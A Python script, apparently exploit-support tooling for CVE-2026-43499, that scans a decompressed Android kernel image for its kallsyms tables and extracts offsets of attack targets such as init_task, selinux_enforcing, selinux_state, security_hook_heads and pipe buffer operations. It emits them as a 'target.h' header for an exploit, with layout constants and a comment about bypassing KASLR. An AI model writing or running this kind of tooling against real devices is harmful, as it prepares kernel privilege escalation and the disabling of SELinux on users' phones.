#!/usr/bin/env python3
"""Extract all CVE-2026-43499 kernel symbol offsets from kallsyms."""

import struct
import sys

def decompress_name(data, pos, names_end, tok_index, tokens):
    """Decompress a single symbol name from the names section."""
    name_parts = []
    while pos < names_end:
        b = data[pos]
        pos += 1
        if b == 0:
            break
        if b < len(tok_index):
            idx = tok_index[b]
            if idx < len(tokens):
                name_parts.append(tokens[idx])
            else:
                name_parts.append(f'?{b}')
        else:
            name_parts.append(f'?{b}')
    return ''.join(name_parts), pos

def parse_tokens(data, tok_table_start, tok_idx_start):
    """Parse the token table and token index."""
    tokens = []
    pos = tok_table_start
    while pos < tok_idx_start:
        end = data.find(b'\x00', pos, tok_idx_start)
        if end < 0:
            break
        token = data[pos:end].decode('ascii', errors='replace')
        tokens.append(token)
        pos = end + 1

    tok_index = [struct.unpack_from('<H', data, tok_idx_start + i*2)[0] for i in range(256)]
    return tokens, tok_index

def main():
    with open('boot_unpacked/kernel.decompressed', 'rb') as f:
        data = f.read()

    fsize = len(data)
    BASE = 0xffffffc010000000

    # Step 1: Parse tokens
    tok_table_start = 0x22F2FCD
    tok_idx_start = 0x22F321D
    tokens, tok_index = parse_tokens(data, tok_table_start, tok_idx_start)
    print(f"Parsed {len(tokens)} tokens, token_index[256] ready")

    # Step 2: Find markers array (just before token table)
    marker_area_end = tok_table_start
    while marker_area_end % 4 != 0:
        marker_area_end -= 1

    print("Searching for markers...")
    best = None
    for m_count in range(200, 800):
        m_start = marker_area_end - m_count * 4
        if m_start < 0x10000:
            continue
        first = struct.unpack_from('<I', data, m_start)[0]
        if first > 500:
            continue

        ok = 0
        prev = -1
        for i in range(m_count):
            val = struct.unpack_from('<I', data, m_start + i*4)[0]
            if val > prev and val < fsize:
                ok += 1
            prev = val

        if ok == m_count:
            last = struct.unpack_from('<I', data, m_start + (m_count-1)*4)[0]
            if 500000 < last < 8000000:
                best = (m_start, m_count, first, last)
                break

    # Fallback: 99% threshold
    if best is None:
        for m_count in range(200, 800):
            m_start = marker_area_end - m_count * 4
            if m_start < 0x10000:
                continue
            first = struct.unpack_from('<I', data, m_start)[0]
            if first > 5000:
                continue
            ok = sum(1 for i in range(m_count)
                    if struct.unpack_from('<I', data, m_start + i*4)[0] >
                       struct.unpack_from('<I', data, m_start + (i-1)*4)[0])
            if ok >= m_count * 0.99:
                last = struct.unpack_from('<I', data, m_start + (ok-2)*4)[0]
                if 500000 < last < 8000000:
                    best = (m_start, ok, first, last)
                    break

    if best is None:
        print("ERROR: Cannot find markers")
        sys.exit(1)

    marker_start, marker_count, first_marker, last_marker = best
    print(f"Found markers: {marker_count} entries at 0x{marker_start:x}")
    print(f"  First={first_marker}, Last={last_marker}")

    # Step 3: Names section
    names_end = marker_start
    names_start = names_end - last_marker
    print(f"Names: 0x{names_start:x} - 0x{names_end:x} ({last_marker} bytes)")

    # Step 4: Find num_syms
    est_syms = marker_count * 256
    num_syms = None
    num_syms_off = None

    for off in range(names_start - 64, names_start + 64, 4):
        val = struct.unpack_from('<I', data, off)[0]
        if est_syms - 500 < val < est_syms + 500:
            num_syms = val
            num_syms_off = off
            break

    if num_syms is None:
        for off in range(names_start - 4096, names_start, 4):
            if off < 0x10000:
                break
            val = struct.unpack_from('<I', data, off)[0]
            if 50000 < val < 200000:
                num_syms = val
                num_syms_off = off
                break

    if num_syms is None:
        print("ERROR: Cannot find num_syms")
        sys.exit(1)

    print(f"num_syms = {num_syms} at 0x{num_syms_off:x}")

    # Step 5: relative_base and offsets
    rel_base_off = num_syms_off - 8
    rel_base = struct.unpack_from('<Q', data, rel_base_off)[0]

    offsets_start = rel_base_off - num_syms * 4
    print(f"kallsyms_relative_base = 0x{rel_base:016x}")
    print(f"kallsyms_offsets at 0x{offsets_start:x} (u32[{num_syms}])")

    # Verify offsets array is sorted
    first_off = struct.unpack_from('<I', data, offsets_start)[0]
    print(f"First offset = 0x{first_off:x}")

    # Step 6: Walk all symbols and find targets
    TARGETS = {
        "init_task", "selinux_enforcing", "anon_pipe_buf_ops",
        "noop_llseek", "no_llseek", "configfs_read_iter",
        "configfs_bin_write_iter", "copy_splice_read",
        "ashmem_fops", "ashmem_misc_fops",
        "kmalloc_caches", "selinux_blob_sizes",
        "security_hook_heads", "empty_zero_page",
        "root_task_group", "init_uts_ns",
        "selinux_state",
        "kernel_read", "kernel_write",
        "generic_file_read_iter", "generic_file_write_iter",
        "simple_read_from_buffer", "simple_write_to_buffer",
        "pipe_read", "pipe_write",
        "nosteal_pipe_buf_ops",
        # Slide symbols
        "init_net", "init_nsproxy",
        # KASLR bypass via slide
        "random_boot_id_data",
    }

    print(f"\n=== Walking {num_syms} symbols to find {len(TARGETS)} targets ===")

    results = {}
    remaining = set(TARGETS)
    npos = names_start
    last_report = 0

    for sym_idx in range(num_syms):
        name, npos = decompress_name(data, npos, names_end, tok_index, tokens)

        if name in remaining:
            sym_off = struct.unpack_from('<I', data, offsets_start + sym_idx * 4)[0]
            sym_addr = BASE + sym_off
            results[name] = (sym_off, sym_addr)
            remaining.remove(name)
            print(f"  [{sym_idx}] {name}: off=0x{sym_off:08x} addr=0x{sym_addr:016x}")

            if not remaining:
                break

        if sym_idx - last_report >= 20000:
            last_report = sym_idx
            # Print list of remaining targets every 20k
            if remaining:
                pass  # keep going

    if remaining:
        print(f"\n  NOT FOUND in kallsyms: {sorted(remaining)}")

    # Step 7: Output results in target.h format
    print("\n" + "="*60)
    print("=== target.h OFFSETS ===")
    print("="*60)

    print(f"""
#define KIMAGE_TEXT_BASE 0x{BASE:016x}ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL
""")

    for name in sorted(results.keys()):
        off, addr = results[name]
        macro_name = name.upper() + "_OFF"
        print(f"#define {macro_name} 0x{off:08x}ULL")

    print(f"\n#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + {results.get('ashmem_fops', (0,0))[0]:#010x}ULL)" if 'ashmem_fops' in results else "// ASHMEM_FOPS not found")
    print(f"#define INIT_TASK (KIMAGE_TEXT_BASE + {results.get('init_task', (0,0))[0]:#010x}ULL)" if 'init_task' in results else "// INIT_TASK not found")

if __name__ == "__main__":
    main()
